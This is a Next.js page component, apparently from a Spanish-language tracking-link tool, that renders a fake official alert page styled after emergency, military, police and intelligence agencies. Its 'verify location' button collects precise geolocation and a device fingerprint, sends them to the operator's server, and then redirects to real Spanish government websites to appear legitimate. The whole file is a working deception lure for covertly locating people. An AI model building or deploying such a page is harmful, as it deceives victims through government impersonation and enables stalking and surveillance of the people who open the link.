"use client"

import { useEffect, useState } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { TrackingService, type TrackingLink } from "@/lib/services/tracking-service"
import { GeoService } from "@/lib/services/geo-service"
import { getTemplate } from "@/config/templates"
import LiveLocationMap from "@/components/map/live-location-map"

interface TrackPageProps {
  params: {
    shortCode: string
  }
}

export default function TrackPage({ params }: TrackPageProps) {
  const [link, setLink] = useState<TrackingLink | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showMap, setShowMap] = useState(false)
  const [locationData, setLocationData] = useState<any>(null)

  useEffect(() => {
    async function loadLink() {
      try {
        const response = await fetch(`/api/tracking-links?shortCode=${params.shortCode}`)
        if (!response.ok) throw new Error('Link no encontrado')
        const data = await response.json()
        if (data.isActive) {
          setLink(data)
        } else {
          setError("Este enlace ha expirado")
        }
      } catch (err) {
        console.error("Error loading tracking link:", err)
        setError("Error al cargar la p√°gina")
      }
    }
    loadLink()
  }, [params.shortCode])

  const handleGetLocation = async () => {
    setIsLoading(true)
    setError(null)

    try {
      // Obtener ubicaci√≥n con m√°xima precisi√≥n
      const position = await GeoService.getCurrentPosition({
        enableHighAccuracy: true,
        timeout: 30000,
        maximumAge: 0
      })

      // Obtener detalles adicionales de la ubicaci√≥n
      const details = await GeoService.getLocationDetails(
        position.latitude,
        position.longitude
      )

      // Guardar datos de ubicaci√≥n
      const locationData = {
        ...position,
        details
      }
      setLocationData(locationData)

      // Capturar la ubicaci√≥n en el servidor
      await fetch('/api/tracking-captures', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          linkId: link!.id,
          ...position,
          deviceInfo: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            vendor: navigator.vendor,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: (navigator as any).deviceMemory,
            connection: (navigator as any).connection?.type,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
          }
        })
      })

      // Mostrar el mapa real
      setShowMap(true)

      // Redirigir despu√©s de capturar la ubicaci√≥n
      setTimeout(() => {
        const redirectUrls: Record<string, string> = {
          alerta_nacional: "https://www.proteccioncivil.es",
          militar: "https://www.defensa.gob.es",
          policial: "https://www.policia.es",
          terrorismo: "https://www.interior.gob.es",
          inteligencia: "https://www.cni.es",
          nuclear: "https://www.csn.es",
          diplomatico: "https://www.exteriores.gob.es",
          defensa: "https://www.defensa.gob.es"
        }
        window.location.href = redirectUrls[link!.templateType] || "https://www.google.com"
      }, 5000)

    } catch (err: any) {
      console.error("Error getting location:", err)
      setError(err.message || "Error al procesar tu solicitud")
    } finally {
      setIsLoading(false)
    }
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white">
        <div className="container max-w-lg mx-auto p-6">
          <Card className="bg-black/40 backdrop-blur-sm border-gray-800">
            <CardContent className="p-6">
              <div className="text-center text-red-400">{error}</div>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  if (!link) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white">
        <div className="container max-w-lg mx-auto p-6">
          <Card className="bg-black/40 backdrop-blur-sm border-gray-800">
            <CardContent className="p-6">
              <div className="flex justify-center">
                <div className="animate-spin rounded-full h-8 w-8 border-2 border-current" />
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  const template = getTemplate(link.templateType)

  return (
    <div className={`min-h-screen bg-gradient-to-br ${template.bgColor} text-white relative overflow-hidden`}>
      {/* Efecto de alerta de emergencia */}
      <div className="absolute inset-0 bg-red-500/20 animate-pulse" 
           style={{ animationDuration: '2s' }} />
      
      {/* L√≠neas de esc√°ner */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute inset-0 opacity-20">
          <div className="h-[2px] w-full bg-blue-400 absolute animate-scan" />
        </div>
      </div>

      <div className="container max-w-lg mx-auto p-6 relative">
        {/* Banner de autenticidad */}
        <div className="mb-4 text-center">
          <div className="inline-flex items-center gap-2 bg-red-500/20 px-3 py-1 rounded-full text-sm font-medium border border-red-500/50">
            <span className="animate-ping absolute inline-flex h-2 w-2 rounded-full bg-red-400 opacity-75"></span>
            <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
            TRANSMISI√ìN SEGURA
          </div>
        </div>

        <Card className="bg-black/60 backdrop-blur-md border-gray-800 relative">
          <CardContent className="p-6 space-y-6">
            {/* Encabezado */}
            <div className="text-center space-y-4">
              <div className="text-6xl">{template.icon}</div>
              <h1 className="text-2xl font-bold">{template.title}</h1>
              <p className="text-lg text-muted-foreground">
                {template.subtitle}
              </p>
            </div>

            {/* Mensaje Principal */}
            <div className="text-center py-4">
              <p className="text-lg">{template.message}</p>
            </div>

            {/* Tiempo Restante */}
            {template.validityPeriod && (
              <div className="text-center text-sm text-yellow-400">
                ‚è∞ V√°lido por: {template.validityPeriod}
              </div>
            )}

            {/* Bot√≥n de Acci√≥n */}
            {!showMap && (
              <Button
                className={`w-full bg-gradient-to-r ${template.bgColor} hover:opacity-90`}
                size="lg"
                onClick={handleGetLocation}
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-current" />
                    <span>Verificando ubicaci√≥n...</span>
                  </div>
                ) : (
                  <>
                    <span className="mr-2">üîí</span>
                    Verificar Ubicaci√≥n
                  </>
                )}
              </Button>
            )}

            {/* Mapa y Estado de Verificaci√≥n */}
            {showMap && (
              <div>
                <div className="w-full h-[300px] rounded-lg overflow-hidden mb-4">
                  <LiveLocationMap
                    height="300px"
                    showAccuracyCircle={true}
                    initialLocation={locationData}
                  />
                </div>
                <p className="text-center text-sm text-green-400">
                  ‚úì Verificaci√≥n exitosa. Redirigiendo...
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
